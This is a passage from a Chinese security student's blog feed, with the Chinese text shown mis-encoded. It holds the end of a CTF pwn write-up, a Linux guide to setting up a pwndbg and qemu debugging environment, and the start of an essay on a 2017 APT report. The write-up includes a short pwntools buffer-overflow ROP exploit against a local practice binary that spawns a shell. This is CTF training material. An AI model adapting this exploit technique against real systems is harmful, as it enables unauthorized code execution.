´"><a href="#äº”-æ”»ç ´" class="headerlink" title="äº”.æ”»ç ´"></a>äº”.æ”»ç ´</h3><blockquote><p>å†™å‡ºexp:    </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Auther__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110b4</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo xiaoyifeng"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xiaoyifeng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getshell"</span><span class="token punctuation">)</span></code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc4518d2ce65.png" class="lazyload"></p></blockquote><blockquote><p>PWNçœŸå¥½ç©ï¼ğŸ˜­ğŸ˜­</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linuxç¯å¢ƒé…ç½®</title>
      <link href="/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•Linuxç¯å¢ƒé…ç½®ã€‚</p><a id="more"></a><h1 id="Linuxç¯å¢ƒé…ç½®"><a href="#Linuxç¯å¢ƒé…ç½®" class="headerlink" title="Linuxç¯å¢ƒé…ç½®"></a>Linuxç¯å¢ƒé…ç½®</h1><blockquote><p>â€‹    ä½œä¸ºä¸€ä¸ªä¿¡å®‰å­¦ä¹ è€…ï¼Œå’Œç¯å¢ƒæ‰“äº¤é“æ˜¯ç»å¸¸çš„äº‹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸ºäºŒè¿›åˆ¶å­¦ä¹ å¼€å§‹åšå‡†å¤‡ï¼Œé…ç½®å„ç§æ¶æ„çš„è°ƒè¯•ç¯å¢ƒï¼Œæé«˜æ•ˆç‡ã€‚</p></blockquote><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><blockquote><p>â€‹    zshæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„linuxç»ˆç«¯shellå·¥å…·ï¼Œè€Œoh-my-zshæ˜¯ä¸€ä¸ªé«˜æ•ˆç‡çš„é…ç½®å·¥å…·ï¼Œé€šè¿‡oh-my-zshå¯ä»¥å¾ˆå¿«åœ°é…ç½®zshï¼Œé‚£ä¹ˆå¦‚ä½•è¿›è¡Œå®Œæ•´åœ°å®‰è£…å‘¢ï¼š</p><blockquote><p>é¦–å…ˆéœ€è¦å®‰è£…pythonçš„pipï¼Œç„¶åå®‰è£…zshï¼Œå†é€šè¿‡<code>sh -c&quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code>å‘½ä»¤æ¥å®‰è£…oh-my-zshã€‚</p><p>é€šè¿‡ä¿®æ”¹<code>~/.zshrc</code>é‡Œçš„å‚æ•°ï¼Œå¦‚ä¸»é¢˜<code>ZSH_THEME=&quot;random&quot;</code>æ¥è®¾ç½®ç»ˆç«¯çš„æ ·å¼ã€‚</p><p>é…ç½®zshè¯­æ³•é«˜äº®ï¼Œ<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code>é€šè¿‡æ­¤å‘½ä»¤ä¸‹è½½æ’ä»¶ï¼Œå¹¶æŒ‰ä¸‹å›¾æ·»åŠ å‚æ•°<code>zsh-syntax-highlighting</code>ã€‚</p><p><img src="https://i.loli.net/2018/10/14/5bc346022c416.png" alt=""></p><p>ä»£ç è‡ªåŠ¨è¡¥æ’ä»¶ä¸‹è½½ <code>git clone https://github.com/zsh-users/zsh-autosuggestions</code> å¹¶æ”¾åœ¨<code>~/.oh-my-zsh/custom/plugins</code>ç›®å½•ä¸‹é¢ï¼Œç„¶ååƒä¸Šé¢ä¸€æ ·æ·»åŠ å‚æ•°å³å¯</p></blockquote></blockquote><h2 id="pwnç¯å¢ƒé…ç½®"><a href="#pwnç¯å¢ƒé…ç½®" class="headerlink" title="pwnç¯å¢ƒé…ç½®"></a>pwnç¯å¢ƒé…ç½®</h2><blockquote><p>å‚ç…§m4xå¤§ä½¬çš„åšå®¢<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">https://m4x.fun/post/how-2-pwn-an-arm-binary/</a></p><ul><li>å®‰è£… gitï¼Œgdb å’Œ gdb-multiarchï¼ŒåŒæ—¶å®‰è£… binfmt*ç”¨æ¥è¯†åˆ«æ–‡ä»¶ç±»å‹</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span> gdb gdb-multiarch$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token string">"binfmt*"</span></code></pre><ul><li>å®‰è£… gdb çš„æ’ä»¶ pwndbgï¼ˆæˆ–è€… gef ç­‰æ”¯æŒå¤šæ¶æ„çš„æ’ä»¶ï¼‰ï¼Œéœ€è¦pipï¼Œpip3ç­‰æ¨¡å—</li></ul><pre><code>$ git clone https://github.com/pwndbg/pwndbg$ cd pwndbg</code></pre><ul><li>å› ä¸ºæˆ‘ç”¨çš„æ˜¯deepinå®‰è£…çš„pwndbgï¼ˆè¿™æ˜¯ä¸ªå‘ç‚¹ï¼‰ï¼Œæ‰€ä»¥éœ€è¦å¯¹setup.shç¨ä½œä¿®æ”¹ï¼Œå¦‚ä¸‹ï¼š</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">set</span> -ex<span class="token comment" spellcheck="true"># Helper functions</span>linux<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Linux <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>osx<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Darwin <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>PYTHON<span class="token operator">=</span><span class="token string">''</span>INSTALLFLAGS<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">if</span> osx <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">==</span> <span class="token string">"--user"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--user"</span><span class="token keyword">else</span>    PYTHON<span class="token operator">=</span><span class="token string">"sudo "</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">hash</span> gdb<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">'Could not find gdb in <span class="token variable">$PATH</span>'</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Update all submodules</span><span class="token comment" spellcheck="true">#git submodule update --init --recursive</span><span class="token comment" spellcheck="true"># Find the Python version used by GDB.</span>PYVER<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import platform; print(".".join(platform.python_version_tuple()[:2]))'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import sys; print(sys.executable)'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token string">"<span class="token variable">${PYVER}</span>"</span><span class="token comment" spellcheck="true"># Find the Python site-packages that we need to use so that</span><span class="token comment" spellcheck="true"># GDB can find the files once we've installed them.</span><span class="token keyword">if</span> linux <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$INSTALLFLAGS</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    SITE_PACKAGES<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import site; print(site.getsitepackages()[0])'</span><span class="token punctuation">)</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--target <span class="token variable">${SITE_PACKAGES}</span>"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Make sure that pip is available</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token variable">${PYTHON}</span> -m pip -V<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token variable">${PYTHON}</span> -m ensurepip <span class="token variable">${INSTALLFLAGS}</span> --upgrade<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Upgrade pip itself</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> --upgrade pip<span class="token comment" spellcheck="true"># Install Python dependencies</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> -Ur requirements.txt<span class="token comment" spellcheck="true"># Load Pwndbg into GDB on every launch.</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> pwndbg ~/.gdbinit <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"source <span class="token variable">$PWD</span>/gdbinit.py"</span> <span class="token operator">>></span> ~/.gdbinit<span class="token keyword">fi</span></code></pre><pre class=" language-bash"><code class="language-bash">$ ./setup.sh</code></pre><ul><li>å®‰è£…qemuæ¨¡æ‹Ÿç¯å¢ƒ</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user</code></pre></blockquote><blockquote><p>é€šè¿‡ qemu æ¨¡æ‹Ÿ arm/mips ç¯å¢ƒï¼Œè¿›è€Œè¿›è¡Œè°ƒè¯• ï¼Œ</p><p><img src="https://i.loli.net/2018/10/14/5bc34c058efc2.png" alt=""></p><p>è¿è¡ŒåŠ¨æ€çš„binary éœ€è¦æˆ‘ä»¬æŸ¥è¯¢å¯¹åº”æ¶æ„çš„å…±äº«åº“ï¼š</p><p><code>apt-cache search &quot;libc6&quot; | grep ARCH</code> </p><p>åŠ¨æ€é“¾æ¥çš„ bianry éœ€è¦ç”¨å¯¹åº”çš„ qemu åŒæ—¶æŒ‡å®šå…±äº«åº“è·¯å¾„ï¼Œä¾‹å¦‚ï¼š</p><p><code>qemu-mipsel -L /usr/mipselbalalbala/  ./add</code></p><blockquote><p>mipsï¼ˆå¤§ç«¯ï¼‰å’Œmipselï¼ˆå°ç«¯ï¼‰æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Œåœ¨äºå­˜å‚¨æ–¹å¼ï¼Œä¸€ä¸ªæ˜¯å¤§ç«¯ï¼ˆä½åºå­˜åœ¨é«˜åœ°å€ï¼ŒæŒ‰é¡ºåºæ¥ï¼‰ï¼Œä¸€ä¸ªæ˜¯å°ç«¯åºï¼ˆå°†ä½åºçš„å­˜åœ¨ä½åœ°å€ï¼Œåå¸¸è¯†æ¥ï¼‰ã€‚å½¢è±¡åœ°è¯´ï¼šå¤§ç«¯æ˜¯ä»ä¸Šå¾€ä¸‹æ‰ï¼Œå°ç«¯æ˜¯ä»ä¸‹å¾€ä¸Šé£ã€‚</p></blockquote><p>æˆ‘ä»¬åªéœ€å®‰è£…ç±»ä¼¼ <strong>libc6-ARCH-cross</strong> å½¢å¼çš„å³å¯ ,é™æ€é“¾æ¥çš„ binary ç›´æ¥è¿è¡Œå³å¯ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å¯¹åº”æ¶æ„çš„ qemuï¼›</p><p>è°ƒè¯•å¯ä»¥ä½¿ç”¨ qemu çš„ -g æŒ‡å®šç«¯å£</p><pre class=" language-bash"><code class="language-bash">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</code></pre><p><img src="https://i.loli.net/2018/10/14/5bc359ad27655.png" alt=""></p><p>ç„¶åä½¿ç”¨<code>gdb-multiarch</code>è¿›è¡Œè°ƒè¯•ï¼Œå…ˆæŒ‡å®šæ¶æ„ï¼Œç„¶åä½¿ç”¨remoteåŠŸèƒ½ </p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> <span class="token keyword">set</span> architecture mips <span class="token punctuation">(</span>ä½†å¤§å¤šæ•°æƒ…å†µä¸‹è¿™ä¸€æ­¥å¯ä»¥çœç•¥, ä¼¼ä¹ pwndbg èƒ½è‡ªåŠ¨è¯†åˆ«æ¶æ„<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> target remote localhost:1234<span class="token comment" spellcheck="true">#pedaåº”è¯¥é—®é¢˜ä¸å¤§</span></code></pre></blockquote><blockquote><p>ä¸‹è½½å…±äº«åº“å­˜åœ¨<code>/usr/</code>ç›®å½•ï¼š</p><p><img src="https://i.loli.net/2018/10/14/5bc3583d78da3.png" alt=""></p></blockquote><h2 id="å¼€å§‹ä½¿ç”¨pwndbgè°ƒè¯•"><a href="#å¼€å§‹ä½¿ç”¨pwndbgè°ƒè¯•" class="headerlink" title="å¼€å§‹ä½¿ç”¨pwndbgè°ƒè¯•"></a>å¼€å§‹ä½¿ç”¨pwndbgè°ƒè¯•</h2><blockquote><p> pwndbgæ­£å¸¸å¯åŠ¨ï¼ˆå¼€å¿ƒğŸ˜„ï¼‰ï¼š<img src="https://i.loli.net/2018/10/14/5bc363e61dd11.png" alt=""></p><p>è®¾ç½®å¥½åŠ¨æ€è°ƒè¯•ç«¯å£ï¼Œé€‰æ‹©å¥½å…±äº«åº“ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc364862d2ce.png" class="lazyload"></p><p>ç„¶åç”¨<code>gdb-multiarch</code> -qå¯åŠ¨ pwndbgï¼Œè®¾ç½®å¥½æ–‡ä»¶æ¶æ„ï¼Œè¿æ¥ç«¯å£ï¼Œå¼€å§‹åŠ¨æ€è°ƒè¯•ï¼š<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc364ebc9a23.png" class="lazyload"></p></blockquote><blockquote><p>â€‹    å¯¹äºé™æ€ç¼–è¯‘çš„ bianryï¼Œ å¯ä»¥ä½¿ç”¨ lscan, flirt, rizzo, bindiff ç­‰å¤šç§æ–¹æ³•æ¢å¤éƒ¨åˆ†ç¬¦å·è¡¨</p><p>åŠ æ²¹å­¦ä¹ å§ï¼</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Pwnç¯å¢ƒé…ç½® </tag>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017APTæŠ¥å‘Šç ”è¯»</title>
      <link href="/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/"/>
      <url>/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>2017 APT æŠ¥å‘Šç ”è¯»</p><a id="more"></a><h1 id="2017-APT-æŠ¥å‘Šç ”è¯»"><a href="#2017-APT-æŠ¥å‘Šç ”è¯»" class="headerlink" title="2017 APT æŠ¥å‘Šç ”è¯»"></a>2017 APT æŠ¥å‘Šç ”è¯»</h1><h2 id="APT-ä¸ç½‘ç»œæˆ˜äº‰ä¸­çš„å¤§å›½åšå¼ˆ"><a href="#APT-ä¸ç½‘ç»œæˆ˜äº‰ä¸­çš„å¤§å›½åšå¼ˆ" class="headerlink" title="APT ä¸ç½‘ç»œæˆ˜äº‰ä¸­çš„å¤§å›½åšå¼ˆ"></a>APT ä¸ç½‘ç»œæˆ˜äº‰ä¸­çš„å¤§å›½åšå¼ˆ</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ä¸ºä»€ä¹ˆå¯¹APTæ–¹é¢çš„ç ”ç©¶è®©ç¾å›½ï¼Œè®©ä¸­å›½ï¼Œè®©ä¸–ç•Œå„å›½å¼€å§‹é‡è§†èµ·æ¥ï¼Ÿæ®æ•°æ®ï¼Œ2017å¹´é­å—APTæ”»å‡»æœ€å¤šçš„å›½å®¶ä¾æ¬¡æ˜¯ï¼šç¾å›½ï¼Œä¸­å›½ï¼Œæ²™ç‰¹ï¼ŒéŸ©å›½ã€ä»¥è‰²åˆ—ã€åœŸè€³å…¶ã€æ—¥æœ¬ã€æ³•å›½ã€ä¿„ç½—æ–¯ã€å¾·å›½ã€è¥¿ç­ç‰™ã€å·´åŸºæ–¯å¦å’Œè‹±å›½ã€‚ä»¥ä¸Šè¿™äº›å›½å®¶ï¼Œè¦ä¹ˆæ˜¯ç»æµåœ°ä½é¢†å…ˆï¼Œè¦ä¹ˆæ˜¯æ‹¥æœ‰å¤§é‡çš„èƒ½æºè´¢å¯Œï¼Œè¦ä¹ˆå°±æ˜¯ç¤¾ä¼šç¯å¢ƒä¸å’Œå¹³ï¼Œé‚£ä¹ˆè¿™ä¸€ç³»åˆ—çš„å› ç´ ï¼Œéƒ½æˆä¸ºäº†APTæ”»å‡»çš„èµ·å› ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; è€Œæœ€å—APTç»„ç»‡å…³æ³¨çš„é¢†åŸŸæˆ–æœºæ„ç±»å‹ä¾æ¬¡ä¸ºï¼šæ”¿åºœã€èƒ½æºã€ é‡‘èã€å›½é˜²ã€äº’è”ç½‘ã€èˆªç©ºèˆªå¤©ã€åª’ä½“ã€ç”µä¿¡ã€åŒ»ç–—ã€åŒ–å·¥ã€‚æ­£å¦‚å‰ä¸ä¹…å‘ç”Ÿï¼Œç°åœ¨ä»åœ¨ç™½çƒ­åŒ–é˜¶æ®µçš„ä¸­ç¾è´¸æ˜“æˆ˜ï¼Œä¸ºäº†å›½å®¶åˆ©ç›Šè€Œå‘èµ·çš„è´¸æ˜“æˆ˜äº‰ï¼›åˆå¦‚æœé²œå½“å‰ä¸ç¨³å®šçš„ç¤¾ä¼šåœ°ä½ï¼Œå›½å®¶å±€åŠ¿ï¼Œä¸éŸ©å›½çš„äº‰ç«¯ã€‚å†æ¯”å¦‚è¯´ï¼Œä¸­ä¸œï¼Œè¥¿äºšåœ°åŒºé¢‘ç¹å‘èµ·çš„æ­¦è£…å†²çªã€‚è¿™ä¸€åˆ‡è¯´åˆ°çš„éƒ½æ˜¯ç°å®ç”Ÿæ´»ä¸­çš„å±€åŠ¿ï¼Œä½†åœ¨ç½‘ç»œä¸–ç•Œä¸­ä¹Ÿä¸€æ ·ï¼Œä¸ºäº†ä¸ºæœ¬å›½å–å¾—ä¸€å®šçš„ä¼˜åŠ¿ï¼Œç½‘ç»œç©ºé—´ä¸­çš„APTç»„ç»‡åŠå…¶æ´»åŠ¨ï¼Œåˆ™ä¸ç°å®ä¸­çš„å¤§å›½åšå¼ˆä¹‹é—´å‘ˆç°å‡ºå¾ˆå¤šå¾®å¦™çš„æ˜¾æ€§è”ç³»ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ—¢ç„¶APTæ”»å‡»å¾ˆæ˜æ˜¾æ˜¯ä¸å›½å®¶ä¹‹é—´åšå¼ˆæœ‰è”ç³»çš„ï¼Œè¿™ä¹Ÿå°±èƒ½è§£é‡Šä¸ºä»€ä¹ˆæŒ‡è´£ä»–å›½çš„APTæ´»åŠ¨æˆä¸ºäº†é‡è¦çš„å¤–äº¤æ‰‹æ®µäº†ã€‚</p></blockquote><h2 id="æˆ‘å›½å¯¹APTçš„ç ”ç©¶åº”å†è¿›ä¸€æ­¥"><a href="#æˆ‘å›½å¯¹APTçš„ç ”ç©¶åº”å†è¿›ä¸€æ­¥" class="headerlink" title="æˆ‘å›½å¯¹APTçš„ç ”ç©¶åº”å†è¿›ä¸€æ­¥"></a>æˆ‘å›½å¯¹APTçš„ç ”ç©¶åº”å†è¿›ä¸€æ­¥</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>å½“ä»Šä¸–ç•Œï¼Œåœ¨APTç ”ç©¶é¢†åŸŸé¥é¥é¢†å…ˆçš„æ˜¯ç¾å›½ï¼Œæ­£å¦‚å„æ–¹é¢ç¾å›½éƒ½å¤„äºéœ¸ä¸»åœ°ä½ä¸€æ ·ï¼ŒAPTç ”ç©¶ä¹Ÿä¸å±ˆå±…äººå</strong>ã€‚è€Œä¸­å›½è™½ç„¶æ’åœ¨ç¬¬äºŒåï¼Œä½†åªæœ‰å››ä¸ªæœºæ„å‘å¸ƒå¤šç¯‡APTç›¸å…³ç ”ç©¶æŠ¥å‘Šï¼Œç›¸æ¯”ç¾å›½çš„24ä¸ªæœºæ„ï¼Œç¾å›½è¶³è¶³æ¯”æˆ‘ä»¬å¤šäº†å…­å€ï¼Œå¯æƒ³è€ŒçŸ¥ï¼Œå…¶ä¸­çš„å„å›½å¯¹APTç ”ç©¶çš„é‡è§†ç¨‹åº¦ä¹Ÿç›¸å·®ç”šè¿œã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>ä¸­å›½å·²ç»æˆä¸ºäº†æœ€å¤§çš„APTæ”»å‡»å—å®³è€…</strong>ï¼Œå¾ˆå¤šå›½å®¶é¢å¯¹ä¸­å›½çš„å‘å±•æ€€ç€ä¸åŒçš„å¿ƒæ€ï¼Œæœ‰çš„æƒ³éåˆ¶ï¼Œæœ‰çš„æƒ³å¸®æ‰¶ï¼Œè€Œæƒ³éåˆ¶çš„è¿™äº›ä¸ªå›½å®¶å°±ä¸åœçš„åœ¨å„æ–¹é¢è´¹å°½å¿ƒæ€æ¥å¯¹ä¸­å›½è¿›è¡Œæ”»å‡»ã€‚ç»Ÿè®¡æ˜¾ç¤ºï¼Œ2017å¹´å…¨å¹´ï¼Œè¿™äº›APTç»„ç»‡å‘åŠ¨çš„æ”»å‡»è¡ŒåŠ¨ï¼Œè‡³å°‘å½±å“äº†ä¸­å›½å¢ƒå†…è¶…è¿‡ä¸‡å°ç”µè„‘ï¼Œæ”»å‡»èŒƒå›´éå¸ƒå›½å†…31ä¸ªçœçº§è¡Œæ”¿åŒºã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; åœ¨ç½‘ç»œç©ºé—´å®‰å…¨æ–¹é¢ï¼Œå„å›½å‡ ä¹éƒ½æ˜¯åŒæ ·çš„èµ·ç‚¹ï¼Œä½†å´å‘å±•æˆäº†ä¸åŒçš„æ°´å¹³ï¼Œå½“å‰ç¾å›½é¢†å…ˆçš„å¯ä¸ä»…ä»…æ˜¯APTæ”»å‡»æ–¹é¢ï¼Œè€Œæ˜¯æ•´ä¸ªç½‘ç»œå®‰å…¨æ–¹é¢ï¼Œæ‰€ä»¥ä¸€æ—¦ç¾å›½å‘èµ·ç½‘ç»œæ”»å‡»ï¼Œå¯ä»¥è¯´å¤§å¤šæ•°å›½å®¶éƒ½æ˜¯æ²¡æœ‰ä»€ä¹ˆæŠµæŠ—ä¹‹åŠ›çš„ã€‚<strong>åˆ«çš„å›½å®¶å’±ä¸ç®¡ï¼Œä¸­å›½ï¼Œå°±ä¸åº”è¯¥å±ˆå±…äººä¸‹ï¼Œå®ç°ä¸­å›½å¤å…´ï¼Œåœ¨å„æ–¹é¢éƒ½åº”è¯¥æŠ“ç´§ï¼Œè€Œç½‘ç»œå®‰å…¨ï¼Œäº’è”ç½‘å®‰å…¨æ­£æ˜¯ä¸å¯å¿½è§†çš„ä¸€ç‚¹ã€‚</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ ¹æ®æŠ¥å‘Šæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºä¸€ä¸ªéå¸¸å…·æœ‰ä»£è¡¨æ€§çš„äº‹å®ï¼Œä¸ä»…ä»…æ˜¯APTæ”»å‡»æ–¹é¢ï¼Œæ‹“å±•ä¸€ä¸‹ï¼Œå„æ–¹é¢çš„ç ”ç©¶äººæ‰ï¼Œæˆ‘ä»¬ç›¸æ¯”ç¾å›½è€Œè¨€éƒ½æ˜¯æœ‰åŠ£åŠ¿çš„ï¼Œæ˜¯å¤§æ˜¯å°åˆ™ä¸ç»†è¯´ã€‚æ˜¯å½“å‰å›½æƒ…é™åˆ¶çš„å—ï¼Ÿä¸ºä»€ä¹ˆç¾å›½å°±é‚£ä¹ˆå¤šç ”ç©¶å‹äººæ‰å‘¢ï¼Ÿå°±ä»å½“å‰å¤§éƒ¨åˆ†å­¦ç”Ÿæ¯•ä¸šç­‰åŒäºå¤±ä¸šçš„ç°è±¡æ¥è¯´ï¼Œå¯èƒ½é—®é¢˜å°±å‡ºç°åœ¨æ•™è‚²ä½“åˆ¶ä»¥åŠä»·å€¼å–å‘äº†ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>é‚£ä¹ˆå›åˆ°ä¸»é¢˜ï¼Œæˆ‘è®¤ä¸ºæˆ‘å›½å¯¹APTæ”»å‡»çš„ç ”ç©¶ä¹ƒè‡³æ•´ä¸ªç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯çš„ç ”ç©¶åº”è¯¥åŠ ç´§æ­¥ä¼ï¼ŒåŠ å¼ºç½‘ç»œé˜²å¾¡å»ºè®¾ï¼ŒåŸ¹å…»ç½‘ç»œæ”»é˜²äººæ‰ï¼Œè¿™æ ·æ‰èƒ½ä¸è½äººåã€‚</strong></p></blockquote><h2 id="ç½‘ç»œå†›ç«æ°‘ç”¨åŒ–è®©ç½‘ç»œæˆ˜äº‰é€æ¸å‡ºç°åœ¨å…¬ä¼—çœ¼å‰"><a href="#ç½‘ç»œå†›ç«æ°‘ç”¨åŒ–è®©ç½‘ç»œæˆ˜äº‰é€æ¸å‡ºç°åœ¨å…¬ä¼—çœ¼å‰" class="headerlink" title="ç½‘ç»œå†›ç«æ°‘ç”¨åŒ–è®©ç½‘ç»œæˆ˜äº‰é€æ¸å‡ºç°åœ¨å…¬ä¼—çœ¼å‰"></a>ç½‘ç»œå†›ç«æ°‘ç”¨åŒ–è®©ç½‘ç»œæˆ˜äº‰é€æ¸å‡ºç°åœ¨å…¬ä¼—çœ¼å‰</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>ä»€ä¹ˆæ˜¯ç½‘ç»œå†›ç«ï¼Ÿ</strong>ç½‘ç»œå†›ç«æ˜¯ä¸€ç§ç½‘ç»œæ­¦å™¨ï¼Œå³å†›ç«çº§çš„ç½‘ç»œæ¼æ´åˆ©ç”¨å·¥å…·ã€‚å°±åƒå»å¹´æ°¸æ’ä¹‹è“å‹’ç´¢è •è™«ç—…æ¯’ï¼ˆWannaCryï¼‰è‚†è™å…¨çƒï¼Œå¯¼è‡´150å¤šä¸ªå›½å®¶ï¼Œ30å¤šä¸‡å—å®³è€…é­é‡å‹’ç´¢è½¯ä»¶ æ”»å‡»ï¼ŒåŒ»ç–—ã€äº¤é€šã€èƒ½æºã€æ•™è‚²ç­‰è¡Œä¸šé¢†åŸŸé­å—å·¨å¤§æŸå¤±ã€‚WannaCryæ®ç§°æ˜¯ç¾å›½å›½å®¶å®‰å…¨å±€ï¼ˆNSAï¼‰æ——ä¸‹æ–¹ç¨‹å¼ç»„ç»‡ï¼ˆEquation 